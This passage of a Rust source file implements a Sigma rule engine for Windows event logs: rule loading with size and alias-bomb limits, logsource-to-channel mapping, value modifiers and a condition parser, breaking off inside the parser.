//! Sigma rule support: load Sigma YAML rules and evaluate them against parsed events.
//!
//! Implements the parts of the Sigma specification that apply to single Windows event
//! logs: field matching with wildcards and value modifiers (`contains`, `startswith`,
//! `endswith`, `all`, `re` with `i`/`m`/`s`, `cased`, `windash`, `base64`, `base64offset`,
//! `utf16le`/`utf16be`/`utf16`/`wide`, `cidr`, `exists`, `gt`/`gte`/`lt`/`lte`, `fieldref`),
//! keyword lists, and conditions (`and`, `or`, `not`, parentheses, `1 of x*`, `all of x*`,
//! `them`). Logsources are mapped to event log channels and event IDs.
//!
//! Not supported (such rules are reported as skipped): aggregations (`| count() ...`),
//! correlation rules, the `expand` placeholder modifier and non-Windows logsources.

use std::collections::HashMap;
use std::net::IpAddr;
use std::path::{Path, PathBuf};

use regex::{Regex, RegexBuilder};
use yaml_serde::Value;

use crate::model::{Col, Record};

/// A parsed Sigma rule, independent of any particular log.
pub struct SigmaRule {
    pub title: String,
    pub id: String,
    pub status: String,
    pub description: String,
    pub author: String,
    pub level: String,
    pub tags: Vec<String>,
    pub references: Vec<String>,
    pub falsepositives: Vec<String>,
    pub license: String,
    pub path: PathBuf,
    pub condition_text: String,
    /// The rule's `detection` section as YAML, for display.
    pub detection_yaml: String,
    gates: Vec<Gate>,
    selections: Vec<Selection>,
    condition: Cond,
}

/// Which events a rule applies to, from its `logsource`.
#[derive(Clone, Debug)]
struct Gate {
    /// Lowercased channel names (any).
    channels: Vec<&'static str>,
    event_ids: Option<&'static [u32]>,
    /// Security 4688 needs Sysmon-style process_creation field names translated.
    map_4688: bool,
}

enum Selection {
    /// OR of maps; each map is an AND of field conditions.
    Maps(Vec<Vec<FieldCond>>),
    /// OR of keywords matched anywhere in the event.
    Keywords(Vec<Pattern>),
}

struct FieldCond {
    field: String,
    all: bool,
    patterns: Vec<Pattern>,
}

enum Pattern {
    Exact {
        lc: String,
        cased: bool,
    },
    Contains {
        lc: String,
        cased: bool,
    },
    StartsWith {
        lc: String,
        cased: bool,
    },
    EndsWith {
        lc: String,
        cased: bool,
    },
    Regex(Regex),
    /// Field missing or empty.
    Null,
    Exists(bool),
    Cidr {
        net: IpAddr,
        prefix: u8,
    },
    Num {
        op: NumOp,
        value: f64,
    },
    FieldRef(String),
}

#[derive(Clone, Copy)]
enum NumOp {
    Gt,
    Gte,
    Lt,
    Lte,
}

#[derive(Debug)]
enum Cond {
    Sel(usize),
    Not(Box<Cond>),
    And(Vec<Cond>),
    Or(Vec<Cond>),
    /// At least `min` (None = all) of these selections.
    Of {
        min: Option<usize>,
        sels: Vec<usize>,
    },
}

// ---------------------------------------------------------------------------- loading

pub struct LoadReport {
    pub rules: Vec<SigmaRule>,
    pub files: usize,
    /// The folder (or one of its parents) ships the Detection Rule License, as SigmaHQ does.
    pub drl: bool,
    /// (file, reason) for rules that couldn't be used.
    pub skipped: Vec<(PathBuf, String)>,
}

/// Recursively load every `.yml`/`.yaml` Sigma rule under `dir`.
pub fn load_dir(dir: &Path) -> LoadReport {
    let mut files = Vec::new();
    collect(dir, &mut files, 0);
    files.sort();
    let mut report = LoadReport {
        rules: Vec::new(),
        files: files.len(),
        drl: ships_drl(dir),
        skipped: Vec::new(),
    };
    for f in files {
        match load_file(&f) {
            Ok(Some(r)) => report.rules.push(r),
            Ok(None) => {}
            Err(e) => report.skipped.push((f, e)),
        }
    }
    report
}

/// Does the chosen folder (or its parent, e.g. `sigma/` when `sigma/rules` was chosen) ship
/// the Detection Rule License?
fn ships_drl(dir: &Path) -> bool {
    dir.ancestors().take(2).any(|d| {
        std::fs::read_dir(d)
            .into_iter()
            .flatten()
            .flatten()
            .take(200)
            .any(|e| {
                let name = e.file_name().to_string_lossy().to_lowercase();
                name.starts_with("license")
                    && read_bounded(&e.path(), 64 * 1024)
                        .is_ok_and(|t| t.contains("Detection Rule License"))
            })
    })
}

const MAX_FILES: usize = 100_000;
const MAX_FILE_BYTES: u64 = 1 << 20;

fn collect(dir: &Path, out: &mut Vec<PathBuf>, depth: usize) {
    if depth > 16 || out.len() >= MAX_FILES {
        return;
    }
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for e in entries.flatten() {
        if out.len() >= MAX_FILES {
            return;
        }
        let p = e.path();
        // Don't follow symlinks out of the chosen folder.
        let Ok(meta) = std::fs::symlink_metadata(&p) else {
            continue;
        };
        if meta.is_dir() {
            let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if !name.starts_with('.') {
                collect(&p, out, depth + 1);
            }
        } else if meta.is_file()
            && meta.len() <= MAX_FILE_BYTES
            && p.extension()
                .is_some_and(|x| x.eq_ignore_ascii_case("yml") || x.eq_ignore_ascii_case("yaml"))
        {
            out.push(p);
        }
    }
}

/// Ok(None) = not a Sigma detection rule (e.g. a config file); Err = a rule we can't use.
pub fn load_file(path: &Path) -> Result<Option<SigmaRule>, String> {
    let text = read_bounded(path, MAX_FILE_BYTES)?;
    parse_rule(&text, path.to_path_buf())
}

/// Read a regular file (never a symlink, FIFO or device) of at most `max` bytes.
fn read_bounded(path: &Path, max: u64) -> Result<String, String> {
    use std::io::Read;
    #[cfg(unix)]
    let file = {
        use std::os::unix::fs::OpenOptionsExt;
        std::fs::OpenOptions::new()
            .read(true)
            .custom_flags(libc_o_nofollow() | libc_o_nonblock())
            .open(path)
    };
    #[cfg(not(unix))]
    let file = std::fs::File::open(path);
    let file = file.map_err(|e| e.to_string())?;
    let meta = file.metadata().map_err(|e| e.to_string())?;
    if !meta.is_file() {
        return Err("not a regular file".into());
    }
    if meta.len() > max {
        return Err("file is too large".into());
    }
    let mut buf = Vec::new();
    file.take(max + 1)
        .read_to_end(&mut buf)
        .map_err(|e| e.to_string())?;
    if buf.len() as u64 > max {
        return Err("file is too large".into());
    }
    String::from_utf8(buf).map_err(|_| "file is not UTF-8 text".into())
}

#[cfg(target_os = "macos")]
fn libc_o_nofollow() -> i32 {
    0x0100
}
#[cfg(target_os = "macos")]
fn libc_o_nonblock() -> i32 {
    0x0004
}
#[cfg(all(unix, not(target_os = "macos")))]
fn libc_o_nofollow() -> i32 {
    0o400000
}
#[cfg(all(unix, not(target_os = "macos")))]
fn libc_o_nonblock() -> i32 {
    0o4000
}

pub fn parse_rule(text: &str, path: PathBuf) -> Result<Option<SigmaRule>, String> {
    let doc: Value = match parse_yaml_limited(text) {
        Ok(v) => v,
        // Multi-document files (rule collections) aren't supported.
        Err(e) => {
            return if text.contains("detection:") {
                Err(format!("YAML: {e}"))
            } else {
                Ok(None)
            }
        }
    };
    let Some(map) = doc.as_mapping() else {
        return Ok(None);
    };
    let get = |k: &str| map.get(k);
    if get("correlation").is_some() {
        return Err("correlation rules are not supported".into());
    }
    let Some(detection) = get("detection").and_then(Value::as_mapping) else {
        return Ok(None);
    };

    let s = |k: &str| get(k).map(scalar_string).unwrap_or_default();
    let list = |k: &str| -> Vec<String> {
        match get(k) {
            Some(Value::Sequence(items)) => items.iter().map(scalar_string).collect(),
            Some(v) => vec![scalar_string(v)],
            None => Vec::new(),
        }
    };
    let status = s("status");
    if status.eq_ignore_ascii_case("deprecated") || status.eq_ignore_ascii_case("unsupported") {
        return Err(format!("status is {status}"));
    }

    let logsource = get("logsource").and_then(Value::as_mapping);
    let ls = |k: &str| {
        logsource
            .and_then(|m| m.get(k))
            .map(scalar_string)
            .unwrap_or_default()
            .to_lowercase()
    };
    let gates = gates_for(&ls("product"), &ls("category"), &ls("service"))?;

    // Selections.
    let mut names = Vec::new();
    let mut selections = Vec::new();
    let mut condition_value = None;
    for (k, v) in detection {
        let key = scalar_string(k);
        match key.as_str() {
            "condition" => condition_value = Some(v.clone()),
            "timeframe" => return Err("timeframe (aggregation) is not supported".into()),
            _ => {
                selections.push(parse_selection(v).map_err(|e| format!("{key}: {e}"))?);
                names.push(key);
            }
        }
    }
    let patterns: usize = selections
        .iter()
        .map(|sel| match sel {
            Selection::Maps(maps) => maps.iter().flatten().map(|fc| fc.patterns.len()).sum(),
            Selection::Keywords(ps) => ps.len(),
        })
        .sum();
    if patterns > MAX_PATTERNS_PER_RULE {
        return Err(format!("rule has too many values ({patterns})"));
    }
    let condition_text = match condition_value {
        Some(Value::String(c)) => c,
        Some(Value::Sequence(cs)) => cs
            .iter()
            .map(|c| format!("({})", scalar_string(c)))
            .collect::<Vec<_>>()
            .join(" or "),
        _ => return Err("missing condition".into()),
    };
    if condition_text.contains('|') {
        return Err("aggregation conditions are not supported".into());
    }
    let condition = parse_condition(&condition_text, &names)?;

    Ok(Some(SigmaRule {
        title: s("title"),
        id: s("id"),
        status,
        description: s("description").trim().to_string(),
        author: s("author"),
        level: s("level").to_lowercase(),
        tags: list("tags"),
        references: list("references"),
        falsepositives: list("falsepositives"),
        license: s("license"),
        path,
        condition_text,
        detection_yaml: yaml_serde::to_string(detection).unwrap_or_default(),
        gates,
        selections,
        condition,
    }))
}

/// Maximum YAML nodes per file, counting nodes replayed through aliases. Sigma rules are a
/// few hundred nodes; this stops alias "bombs" (an anchor referenced many times) long before
/// they can allocate much memory.
const MAX_YAML_NODES: usize = 50_000;

/// Parse YAML into a `Value`, refusing documents that expand to too many nodes.
fn parse_yaml_limited(text: &str) -> Result<Value, String> {
    use serde::de::DeserializeSeed;
    let budget = std::cell::Cell::new(MAX_YAML_NODES);
    let de = yaml_serde::Deserializer::from_str(text);
    Budgeted(&budget).deserialize(de).map_err(|e| e.to_string())
}

struct Budgeted<'a>(&'a std::cell::Cell<usize>);

impl Budgeted<'_> {
    fn spend<E: serde::de::Error>(&self) -> Result<(), E> {
        match self.0.get().checked_sub(1) {
            Some(left) => {
                self.0.set(left);
                Ok(())
            }
            None => Err(E::custom(
                "YAML document is too large (possible alias bomb)",
            )),
        }
    }
}

impl<'de> serde::de::DeserializeSeed<'de> for Budgeted<'_> {
    type Value = Value;
    fn deserialize<D: serde::Deserializer<'de>>(self, d: D) -> Result<Value, D::Error> {
        d.deserialize_any(self)
    }
}

impl<'de> serde::de::Visitor<'de> for Budgeted<'_> {
    type Value = Value;

    fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        f.write_str("a YAML value")
    }
    fn visit_bool<E: serde::de::Error>(self, v: bool) -> Result<Value, E> {
        self.spend()?;
        Ok(Value::Bool(v))
    }
    fn visit_i64<E: serde::de::Error>(self, v: i64) -> Result<Value, E> {
        self.spend()?;
        Ok(Value::Number(v.into()))
    }
    fn visit_u64<E: serde::de::Error>(self, v: u64) -> Result<Value, E> {
        self.spend()?;
        Ok(Value::Number(v.into()))
    }
    fn visit_f64<E: serde::de::Error>(self, v: f64) -> Result<Value, E> {
        self.spend()?;
        Ok(Value::Number(v.into()))
    }
    fn visit_str<E: serde::de::Error>(self, v: &str) -> Result<Value, E> {
        self.spend()?;
        Ok(Value::String(v.to_string()))
    }
    fn visit_string<E: serde::de::Error>(self, v: String) -> Result<Value, E> {
        self.spend()?;
        Ok(Value::String(v))
    }
    fn visit_unit<E: serde::de::Error>(self) -> Result<Value, E> {
        self.spend()?;
        Ok(Value::Null)
    }
    fn visit_none<E: serde::de::Error>(self) -> Result<Value, E> {
        self.visit_unit()
    }
    fn visit_some<D: serde::Deserializer<'de>>(self, d: D) -> Result<Value, D::Error> {
        serde::de::DeserializeSeed::deserialize(Budgeted(self.0), d)
    }
    fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut seq: A) -> Result<Value, A::Error> {
        self.spend()?;
        let mut out = Vec::new();
        while let Some(v) = seq.next_element_seed(Budgeted(self.0))? {
            out.push(v);
        }
        Ok(Value::Sequence(out))
    }
    fn visit_map<A: serde::de::MapAccess<'de>>(self, mut map: A) -> Result<Value, A::Error> {
        self.spend()?;
        let mut out = yaml_serde::Mapping::new();
        while let Some(k) = map.next_key_seed(Budgeted(self.0))? {
            let v = map.next_value_seed(Budgeted(self.0))?;
            out.insert(k, v);
        }
        Ok(Value::Mapping(out))
    }
}

fn scalar_string(v: &Value) -> String {
    match v {
        Value::String(s) => s.clone(),
        Value::Number(n) => n.to_string(),
        Value::Bool(b) => b.to_string(),
        Value::Null => String::new(),
        other => yaml_serde::to_string(other)
            .unwrap_or_default()
            .trim()
            .to_string(),
    }
}

// ---------------------------------------------------------------------------- logsources

const SYSMON: &str = "microsoft-windows-sysmon/operational";
const SECURITY: &str = "security";

fn gates_for(product: &str, category: &str, service: &str) -> Result<Vec<Gate>, String> {
    if !product.is_empty() && product != "windows" {
        return Err(format!("product '{product}' is not Windows"));
    }
    let sysmon = |ids: &'static [u32]| Gate {
        channels: vec![SYSMON],
        event_ids: Some(ids),
        map_4688: false,
    };
    if !category.is_empty() {
        let gates = match category {
            "process_creation" => vec![
                sysmon(&[1]),
                Gate {
                    channels: vec![SECURITY],
                    event_ids: Some(&[4688]),
                    map_4688: true,
                },
            ],
            "file_change" => vec![sysmon(&[2])],
            "network_connection" => vec![sysmon(&[3])],
            "sysmon_status" => vec![sysmon(&[4, 16])],
            "process_termination" => vec![sysmon(&[5])],
            "driver_load" => vec![sysmon(&[6])],
            "image_load" => vec![sysmon(&[7])],
            "create_remote_thread" => vec![sysmon(&[8])],
            "raw_access_thread" | "raw_access_read" => vec![sysmon(&[9])],
            "process_access" => vec![sysmon(&[10])],
            "file_event" => vec![sysmon(&[11])],
            "registry_add" | "registry_delete" => vec![sysmon(&[12])],
            "registry_set" => vec![sysmon(&[13])],
            "registry_rename" => vec![sysmon(&[14])],
            "registry_event" => vec![sysmon(&[12, 13, 14])],
            "create_stream_hash" => vec![sysmon(&[15])],
            "pipe_created" => vec![sysmon(&[17, 18])],
            "wmi_event" => vec![sysmon(&[19, 20, 21])],
            "dns_query" => vec![sysmon(&[22])],
            "file_delete" => vec![sysmon(&[23, 26])],
            "clipboard_capture" => vec![sysmon(&[24])],
            "process_tampering" => vec![sysmon(&[25])],
            "file_block_executable" => vec![sysmon(&[27])],
            "file_block_shredding" => vec![sysmon(&[28])],
            "file_executable_detected" => vec![sysmon(&[29])],
            "sysmon_error" => vec![sysmon(&[255])],
            "ps_script" => vec![Gate {
                channels: vec![
                    "microsoft-windows-powershell/operational",
                    "powershellcore/operational",
                ],
                event_ids: Some(&[4104]),
                map_4688: false,
            }],
            "ps_module" => vec![Gate {
                channels: vec![
                    "microsoft-windows-powershell/operational",
                    "powershellcore/operational",
                ],
                event_ids: Some(&[4103]),
                map_4688: false,
            }],
            "ps_classic_start" => vec![Gate {
                channels: vec!["windows powershell"],
                event_ids: Some(&[400]),
                map_4688: false,
            }],
            "ps_classic_provider_start" => {
                vec![Gate {
                    channels: vec!["windows powershell"],
                    event_ids: Some(&[600]),
                    map_4688: false,
                }]
            }
            "ps_classic_script" => vec![Gate {
                channels: vec!["windows powershell"],
                event_ids: Some(&[800]),
                map_4688: false,
            }],
            other => return Err(format!("logsource category '{other}' is not supported")),
        };
        return Ok(gates);
    }
    let channels: Vec<&'static str> = match service {
        "security" => vec![SECURITY],
        "system" => vec!["system"],
        "application" => vec!["application"],
        "sysmon" => vec![SYSMON],
        "powershell" => vec![
            "microsoft-windows-powershell/operational",
            "powershellcore/operational",
        ],
        "powershell-classic" => vec!["windows powershell"],
        "windefend" => vec!["microsoft-windows-windows defender/operational"],
        "taskscheduler" => vec!["microsoft-windows-taskscheduler/operational"],
        "wmi" => vec!["microsoft-windows-wmi-activity/operational"],
        "terminalservices-localsessionmanager" => {
            vec!["microsoft-windows-terminalservices-localsessionmanager/operational"]
        }
        "firewall-as" => vec!["microsoft-windows-windows firewall with advanced security/firewall"],
        "bits-client" => vec!["microsoft-windows-bits-client/operational"],
        "codeintegrity-operational" => vec!["microsoft-windows-codeintegrity/operational"],
        "dns-server" => vec!["dns server"],
        "dns-client" => vec!["microsoft-windows-dns client events/operational"],
        "driver-framework" => vec!["microsoft-windows-driverframeworks-usermode/operational"],
        "ntlm" => vec!["microsoft-windows-ntlm/operational"],
        "printservice-admin" => vec!["microsoft-windows-printservice/admin"],
        "printservice-operational" => vec!["microsoft-windows-printservice/operational"],
        "smbclient-security" => vec!["microsoft-windows-smbclient/security"],
        "smbclient-connectivity" => vec!["microsoft-windows-smbclient/connectivity"],
        "appxdeployment-server" => vec!["microsoft-windows-appxdeploymentserver/operational"],
        "appxpackaging-om" => {
            vec!["microsoft-windows-appxpackagingom/microsoft-windows-appxpackaging/operational"]
        }
        "msexchange-management" => vec!["msexchange management"],
        "dhcp" => vec!["microsoft-windows-dhcp-server/operational"],
        "openssh" => vec!["openssh/operational"],
        "ldap" | "ldap_debug" => vec!["microsoft-windows-ldap-client/debug"],
        "shell-core" => vec!["microsoft-windows-shell-core/operational"],
        "capi2" => vec!["microsoft-windows-capi2/operational"],
        "certificateservicesclient-lifecycle-system" => {
            vec!["microsoft-windows-certificateservicesclient-lifecycle-system/operational"]
        }
        "diagnosis-scripted" => vec!["microsoft-windows-diagnosis-scripted/operational"],
        "lsa-server" => vec!["microsoft-windows-lsa/operational"],
        "vhdmp" => vec!["microsoft-windows-vhdmp-operational"],
        "bitlocker" => vec!["microsoft-windows-bitlocker/bitlocker management"],
        "applocker" => vec![
            "microsoft-windows-applocker/msi and script",
            "microsoft-windows-applocker/exe and dll",
            "microsoft-windows-applocker/packaged app-deployment",
            "microsoft-windows-applocker/packaged app-execution",
        ],
        "kernel-shimengine" => vec!["microsoft-windows-kernel-shimengine/operational"],
        "hyper-v-worker" => vec!["microsoft-windows-hyper-v-worker-admin"],
        "iis-configuration" => vec!["microsoft-iis-configuration/operational"],
        "security-mitigations" => vec![
            "microsoft-windows-security-mitigations/kernel mode",
            "microsoft-windows-security-mitigations/user mode",
        ],
        "smbserver-connectivity" => vec!["microsoft-windows-smbserver/connectivity"],
        "appmodel-runtime" => vec!["microsoft-windows-appmodel-runtime/admin"],
        "microsoft-servicebus-client" => vec!["microsoft-servicebus-client"],
        "dns-server-analytic" => vec!["microsoft-windows-dns-server/analytical"],
        "" => return Err("logsource has neither category nor service".into()),
        other => return Err(format!("logsource service '{other}' is not supported")),
    };
    Ok(vec![Gate {
        channels,
        event_ids: None,
        map_4688: false,
    }])
}

// ---------------------------------------------------------------------------- selections

/// Most value patterns one rule may compile (after windash / base64 expansion).
const MAX_PATTERNS_PER_RULE: usize = 2_000;

fn parse_selection(v: &Value) -> Result<Selection, String> {
    match v {
        Value::Mapping(m) => Ok(Selection::Maps(vec![parse_map(m)?])),
        Value::Sequence(items) if items.iter().all(|i| i.is_mapping()) => {
            let maps = items
                .iter()
                .map(|i| parse_map(i.as_mapping().unwrap()))
                .collect::<Result<Vec<_>, _>>()?;
            Ok(Selection::Maps(maps))
        }
        Value::Sequence(items) => {
            let mut patterns = Vec::new();
            for i in items {
                if i.is_mapping() || i.is_sequence() {
                    return Err("mixed keyword list".into());
                }
                patterns.extend(compile_value(i, &[], MatchKind::Contains)?);
            }
            Ok(Selection::Keywords(patterns))
        }
        scalar => Ok(Selection::Keywords(compile_value(
            scalar,
            &[],
            MatchKind::Contains,
        )?)),
    }
}

fn parse_map(m: &yaml_serde::Mapping) -> Result<Vec<FieldCond>, String> {
    let mut conds = Vec::new();
    for (k, v) in m {
        let key = scalar_string(k);
        let mut parts = key.split('|');
        let field = parts.next().unwrap_or("").trim().to_string();
        let mods: Vec<String> = parts.map(|p| p.trim().to_lowercase()).collect();
        if field.is_empty() {
            return Err("keyword maps are not supported".into());
        }
        let all = mods.iter().any(|m| m == "all");
        let kind = if mods.iter().any(|m| m == "contains") {
            MatchKind::Contains
        } else if mods.iter().any(|m| m == "startswith") {
            MatchKind::StartsWith
        } else if mods.iter().any(|m| m == "endswith") {
            MatchKind::EndsWith
        } else {
            MatchKind::Exact
        };
        let values: Vec<&Value> = match v {
            Value::Sequence(items) => items.iter().collect(),
            single => vec![single],
        };
        let mut patterns = Vec::new();
        for value in values {
            if value.is_mapping() || value.is_sequence() {
                return Err(format!("{field}: nested values are not supported"));
            }
            patterns.extend(compile_value(value, &mods, kind)?);
        }
        conds.push(FieldCond {
            field: field.to_lowercase(),
            all,
            patterns,
        });
    }
    Ok(conds)
}

#[derive(Clone, Copy, PartialEq)]
enum MatchKind {
    Exact,
    Contains,
    StartsWith,
    EndsWith,
}

/// Turn one YAML value plus modifiers into one or more patterns (alternatives).
fn compile_value(v: &Value, mods: &[String], kind: MatchKind) -> Result<Vec<Pattern>, String> {
    let has = |m: &str| mods.iter().any(|x| x == m);
    for m in mods {
        match m.as_str() {
            "contains" | "startswith" | "endswith" | "all" | "re" | "i" | "m" | "s" | "cased"
            | "windash" | "base64" | "base64offset" | "utf16le" | "utf16be" | "utf16" | "wide"
            | "cidr" | "exists" | "gt" | "gte" | "lt" | "lte" | "fieldref" => {}
            other => return Err(format!("modifier '{other}' is not supported")),
        }
    }
    if has("exists") {
        let b = matches!(v, Value::Bool(true)) || scalar_string(v).eq_ignore_ascii_case("true");
        return Ok(vec![Pattern::Exists(b)]);
    }
    if v.is_null() {
        return Ok(vec![Pattern::Null]);
    }
    let raw = scalar_string(v);
    if has("fieldref") {
        return Ok(vec![Pattern::FieldRef(raw.to_lowercase())]);
    }
    for (m, op) in [
        ("gt", NumOp::Gt),
        ("gte", NumOp::Gte),
        ("lt", NumOp::Lt),
        ("lte", NumOp::Lte),
    ] {
        if has(m) {
            let value = raw
                .parse::<f64>()
                .map_err(|_| format!("'{raw}' is not a number"))?;
            return Ok(vec![Pattern::Num { op, value }]);
        }
    }
    if has("cidr") {
        let (ip, prefix) = raw
            .split_once('/')
            .ok_or_else(|| format!("bad CIDR '{raw}'"))?;
        let net: IpAddr = ip.parse().map_err(|_| format!("bad CIDR '{raw}'"))?;
        let prefix: u8 = prefix.parse().map_err(|_| format!("bad CIDR '{raw}'"))?;
        return Ok(vec![Pattern::Cidr { net, prefix }]);
    }
    if has("re") {
        let re = RegexBuilder::new(&raw)
            .case_insensitive(has("i"))
            .multi_line(has("m"))
            .dot_matches_new_line(has("s"))
            .size_limit(4 << 20)
            .dfa_size_limit(1 << 20)
            .build()
            .map_err(|e| format!("regex: {e}"))?;
        return Ok(vec![Pattern::Regex(re)]);
    }

    let cased = has("cased");
    // Transformations that produce literal strings (no wildcards afterwards).
    let encoded = has("base64") || has("base64offset");
    let mut values = vec![raw];
    if has("windash") {
        values = values.iter().flat_map(|v| windash(v)).collect();
    }
    if encoded {
        let utf16 = if has("utf16le") || has("wide") {
            Some(Utf16::Le)
        } else if has("utf16be") {
            Some(Utf16::Be)
        } else if has("utf16") {
            Some(Utf16::Bom)
        } else {
            None
        };
        values = values
            .iter()
            .flat_map(|v| {
                let bytes = match utf16 {
                    Some(enc) => utf16_bytes(v, enc),
                    None => v.as_bytes().to_vec(),
                };
                if has("base64offset") {
                    base64_offsets(&bytes)
                } else {
                    vec![base64(&bytes)]
                }
            })
            .collect();
    }

    values
        .into_iter()
        .map(|v| {
            if encoded {
                // Base64 is case-sensitive.
                return Ok(literal(v, kind, true));
            }
            let glob = parse_glob(&v);
            if glob.iter().all(|t| matches!(t, GlobTok::Lit(_))) {
                let text: String = glob
                    .iter()
                    .map(|t| if let GlobTok::Lit(c) = t { *c } else { ' ' })
                    .collect();
                Ok(literal(text, kind, cased))
            } else {
                let mut re = String::new();
                if matches!(kind, MatchKind::Exact | MatchKind::StartsWith) {
                    re.push('^');
                }
                for t in &glob {
                    match t {
                        GlobTok::Lit(c) => re.push_str(&regex::escape(&c.to_string())),
                        GlobTok::Many => re.push_str(".*"),
                        GlobTok::One => re.push('.'),
                    }
                }
                if matches!(kind, MatchKind::Exact | MatchKind::EndsWith) {
                    re.push('$');
                }
                RegexBuilder::new(&re)
                    .case_insensitive(!cased)
                    .dot_matches_new_line(true)
                    .size_limit(4 << 20)
                    .dfa_size_limit(1 << 20)
                    .build()
                    .map(Pattern::Regex)
                    .map_err(|e| format!("wildcard: {e}"))
            }
        })
        .collect()
}

fn literal(v: String, kind: MatchKind, cased: bool) -> Pattern {
    let lc = if cased { v } else { v.to_lowercase() };
    match kind {
        MatchKind::Exact => Pattern::Exact { lc, cased },
        MatchKind::Contains => Pattern::Contains { lc, cased },
        MatchKind::StartsWith => Pattern::StartsWith { lc, cased },
        MatchKind::EndsWith => Pattern::EndsWith { lc, cased },
    }
}

enum GlobTok {
    Lit(char),
    Many,
    One,
}

/// Sigma string escaping: `*` and `?` are wildcards; `\*`, `\?` and `\\` are literals; any
/// other backslash is a literal backslash.
fn parse_glob(s: &str) -> Vec<GlobTok> {
    let chars: Vec<char> = s.chars().collect();
    let mut out = Vec::with_capacity(chars.len());
    let mut i = 0;
    while i < chars.len() {
        match chars[i] {
            '\\' if matches!(chars.get(i + 1), Some('*' | '?' | '\\')) => {
                out.push(GlobTok::Lit(chars[i + 1]));
                i += 2;
                continue;
            }
            '*' => out.push(GlobTok::Many),
            '?' => out.push(GlobTok::One),
            c => out.push(GlobTok::Lit(c)),
        }
        i += 1;
    }
    out
}

/// `windash`: variants with option dashes replaced by `/`, en dash, em dash and horizontal bar.
fn windash(v: &str) -> Vec<String> {
    let chars: Vec<char> = v.chars().collect();
    let is_word = |c: char| c.is_alphanumeric() || c == '_';
    let positions: Vec<usize> = (0..chars.len())
        .filter(|&i| {
            matches!(chars[i], '-' | '/')
                && (i == 0 || !is_word(chars[i - 1]))
                && chars.get(i + 1).is_some_and(|c| is_word(*c))
        })
        .collect();
    let mut out = vec![v.to_string()];
    if positions.is_empty() {
        return out;
    }
    for dash in ['-', '/', '\u{2013}', '\u{2014}', '\u{2015}'] {
        let mut c = chars.clone();
        for &p in &positions {
            c[p] = dash;
        }
        let s: String = c.into_iter().collect();
        if !out.contains(&s) {
            out.push(s);
        }
    }
    out
}

#[derive(Clone, Copy)]
enum Utf16 {
    Le,
    Be,
    Bom,
}

fn utf16_bytes(s: &str, enc: Utf16) -> Vec<u8> {
    let mut out = Vec::new();
    if matches!(enc, Utf16::Bom) {
        out.extend([0xFF, 0xFE]);
    }
    for u in s.encode_utf16() {
        match enc {
            Utf16::Be => out.extend(u.to_be_bytes()),
            _ => out.extend(u.to_le_bytes()),
        }
    }
    out
}

fn base64(bytes: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let b = [
            chunk[0],
            *chunk.get(1).unwrap_or(&0),
            *chunk.get(2).unwrap_or(&0),
        ];
        let n = (b[0] as u32) << 16 | (b[1] as u32) << 8 | b[2] as u32;
        out.push(T[(n >> 18) as usize & 63] as char);
        out.push(T[(n >> 12) as usize & 63] as char);
        out.push(if chunk.len() > 1 {
            T[(n >> 6) as usize & 63] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            T[n as usize & 63] as char
        } else {
            '='
        });
    }
    out
}

/// The three base64 encodings of `value` as it would appear at any offset inside a longer
/// base64 string (same algorithm as pySigma's `base64offset`).
fn base64_offsets(value: &[u8]) -> Vec<String> {
    const START: [usize; 3] = [0, 2, 3];
    const END_TRIM: [usize; 3] = [0, 3, 2];
    (0..3)
        .map(|i| {
            let mut padded = vec![b' '; i];
            padded.extend_from_slice(value);
            let enc = base64(&padded);
            let end = enc.len() - END_TRIM[(value.len() + i) % 3];
            enc.get(START[i]..end).unwrap_or("").to_string()
        })
        .filter(|s| !s.is_empty())
        .collect()
}

// ---------------------------------------------------------------------------- conditions

#[derive(Debug, Clone, PartialEq)]
enum Tok {
    LParen,
    RParen,
    And,
    Or,
    Not,
    Of,
    All,
    Them,
    Num(usize),
    Ident(String),
}

fn tokenize(s: &str) -> Vec<Tok> {
    let mut out = Vec::new();
    let mut word = String::new();
    let flush = |word: &mut String, out: &mut Vec<Tok>| {
        if word.is_empty() {
            return;
        }
        let tok = match word.to_lowercase().as_str() {
            "and" => Tok::And,
            "or" => Tok::Or,
            "not" => Tok::Not,
            "of" => Tok::Of,
            "all" => Tok::All,
            "them" => Tok::Them,
            w if w.chars().all(|c| c.is_ascii_digit()) => Tok::Num(w.parse().unwrap_or(usize::MAX)),
            _ => Tok::Ident(word.clone()),
        };
        out.push(tok);
        word.clear();
    };
    for c in s.chars() {
        match c {
            '(' | ')' => {
                flush(&mut word, &mut out);
                out.push(if c == '(' { Tok::LParen } else { Tok::RParen });
            }
            c if c.is_whitespace() => flush(&mut word, &mut out),
            c => word.push(c),
        }
    }
    flush(&mut word, &mut out);
    out
}

/// Deepest nesting of parentheses / `not` accepted in a condition.
const MAX_CONDITION_DEPTH: usize = 64;
const MAX_CONDITION_TOKENS: usize = 4096;

fn parse_condition(text: &str, names: &[String]) -> Result<Cond, String> {
    let toks = tokenize(text);
    if toks.len() > MAX_CONDITION_TOKENS {
        return Err("condition is too long".into());
    }
    let mut p = CondParser {
        toks: &toks,
        pos: 0,
        names,
        depth: 0,
    };
    let c = p.expr()?;
    if p.pos != toks.len() {
        return Err(format!("unexpected '{:?}' in condition", toks[p.pos]));
    }
    Ok(c)
}

struct CondParser<'a> {
    toks: &'a [Tok],
    pos: usize,
    names: &'a [String],
    depth: usize,
}

impl CondParser<'_> {
    fn peek(&self) -> Option<&Tok> {
        self.toks.get(self.pos)
    }

    fn expr(&mut self) -> Result<Cond, String> {
        let mut terms = vec![self.term()?];
        while self.peek() == Some(&Tok::Or) {
            self.pos += 1;
            terms.push(self.term()?);
        }
        Ok(if terms.len() == 1 {
            terms.pop().unwrap()
        } else {
            Cond::Or(terms)
        })
    }

    fn term(&mut self) -> Result<Cond, String> {
        let mut factors = vec![self.factor()?];
        while self.peek() == Some(&Tok::And) {
            self.pos += 1;
            factors.push(self.factor()?);
        }
        Ok(if factors.len() == 1 {
            factors.pop().unwrap()
        } else {
            Cond::And(factors)
        })
    }

    fn factor(&mut self) -> Result<Cond, String> {
